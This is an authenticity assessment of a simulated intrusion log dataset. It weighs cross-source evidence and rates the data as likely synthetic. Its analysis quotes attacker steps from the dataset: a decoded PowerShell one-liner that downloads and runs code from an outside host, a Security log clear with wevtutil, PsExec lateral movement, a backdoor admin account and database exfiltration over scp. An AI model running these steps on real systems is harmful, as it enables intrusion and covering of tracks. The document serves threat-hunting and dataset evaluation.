# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Synthetic
**Confidence:** 70

## Executive Summary

The dataset has a coherent, huntable intrusion narrative with strong multi-source pivots, and much of the Windows/Zeek/source-native detail is impressively plausible. I assess it as synthetic because the attack chain is unusually runbook-clean inside a short window, several benign command patterns look pool-generated, and one File-SRV lateral-use sequence has a concrete cross-source timing gap.

## Evidence For Synthetic

- `FILE-SRV-01.meridianhcs.local/windows_event_security.xml` shows `svc_mhsync` logon from `10.10.1.35` at `2024-03-18T17:01:07.8604423Z`, followed by `net view \\FILE-SRV-01` and `Compress-Archive ... cache_7f3a.zip` at `17:01:09` and `17:01:21`. But `zeek-core/conn.json` has no `10.10.1.35 -> 10.10.2.20` flow in that interval; the prior SMB flow ended at `16:50:53`, and the next visible SMB flow is `17:21:45`.
- The attack sequence is very textbook-dense: PsExec service creation on DC at `16:00:12`, domain admin backdoor account at `16:14-16:15`, service/task persistence at `16:20`, File-SRV staging at `17:01`, DB dump at `17:14`, SCP transfer at `17:20`, encoded PowerShell at `17:41`, Security log clear at `17:41:42`, and account deletion at `17:49-17:50`.
- Reused Linux/admin command strings look generated from pools: `kubectl get nodes -o wide` appears 21 times across five hosts/users; the exact GitLab/Grafana `curl` probes recur across `APP-INT-01`, `DB-PROD-01`, `PROXY-01`, and `WEB-EXT-01`; simple commands like `head`, `tail -20`, and `kubectl logs ... --tail=100` recur broadly with little human variation.
- Some suspicious actions are very neatly labeled for hunting: `svc_mhsync`, `DeviceSyncSvc`, `cache_7f3a.zip`, `/tmp/rpt_0318.sql.gz`, and `api.westbridge-services.net/v2/manifest` are realistic enough individually, but collectively feel intentionally discoverable.

## Evidence For Real

- Windows event semantics are strong: DC has 4697 service install, 4688 process creation, 4720 user creation, 4728 Domain Admins membership, 4698 scheduled task, 1102 log clear, and 4726 user deletion in plausible order.
- The Security log clear is source-native believable: `wevtutil cl Security` at `2024-03-18T17:41:41.9213396Z`, then Event ID 1102 at `17:41:42.8093377Z` with `EventRecordID=3`, followed by new low record IDs.
- DB exfil correlation is excellent: `DB-PROD-01` root bash/eCAR show `mysqldump`, `gzip`, and `scp` at `17:14-17:20`; `zeek-core/conn.json` shows SSH from `10.10.4.10` to `10.10.2.30` at `17:20:36`; `APP-INT-01/ecar.json` creates `/tmp/.cache/rpt_0318.sql.gz` at `17:20:38`.
- Background telemetry feels lived-in: Windows Update, Dropbox, Zscaler, AnyConnect, Defender, sysstat, apt/snap/npm, OCSP, DHCP, LDAP/Kerberos/SMB, stale-account failures, and browser/proxy traffic all appear with varied timing and outcomes.

## Detailed Analysis

The core intrusion storyline is coherent. `WS-AJOHNSON-01` performs privilege/account discovery (`whoami /all`, `net group "Domain Admins" /domain`) around `15:20`, then `DC-01` records an `aisha.johnson` type 3 logon from `10.10.1.35` at `16:00:11`, followed by `PSEXESVC` service installation and `cmd.exe /c whoami && hostname`. Zeek supports this with DCE/RPC and SMB from `10.10.1.35` to `10.10.2.10` at `16:00:12`.

The DC tradecraft then follows a plausible but very clean escalation path: `svc_mhsync` is created and added to Domain Admins, `DeviceSyncSvc` is installed and scheduled hourly, and later PSEXESVC launches encoded PowerShell. The encoded command decodes to `IEX (New-Object Net.WebClient).DownloadString("https://api.westbridge-services.net/v2/manifest")`, and Zeek shows proxy/TLS activity to `api.westbridge-services.net` within seconds.

The File-SRV staging is the weakest correlation. The host logs show `svc_mhsync` logging on from `10.10.1.35` and creating `C:\ProgramData\Microsoft\cache_7f3a.zip`; however, the network layer does not show the expected contemporaneous workstation-to-file-server connection. A later `17:24:32` SMB transfer from `10.10.1.35` to `10.10.2.20` with `314272438` response bytes is very plausible as archive retrieval, but it does not explain the earlier `17:01` remote execution.

Normal activity is better than typical synthetic data. There are stale users (`jennifer.walsh`, `svc_mgmt`), failed logons with realistic statuses, public update domains, proxy CONNECTs with reasonable user agents, TLS cert reuse, and both successful and reset flows. That background materially lowers my confidence; the dataset is not cartoonish.

## Realism Score by Category

- **Field format accuracy:** 8 — Windows, Sysmon, Zeek, X509, and proxy fields mostly match source-native expectations.
- **Temporal patterns:** 7 — Background timing has jitter, but the attack sequence is unusually tidy and compressed.
- **Cross-source correlation:** 8 — Most pivots correlate well; File-SRV `17:01` lateral activity is the main gap.
- **Behavioral realism:** 7 — Tradecraft is plausible, but command reuse and labeled artifacts feel exercise-like.
- **Environmental consistency:** 8 — Host/IP roles, AD naming, proxy placement, and server/workstation behavior are internally consistent.

## Recommendations

If synthetic, improve it by adding a contemporaneous network path for the `17:01` `svc_mhsync` File-SRV activity, varying repeated admin command strings by user/host, and making the attack chain less perfectly sequential. Add more benign near-misses and operator mistakes around the main storyline so pivots feel discovered rather than staged.
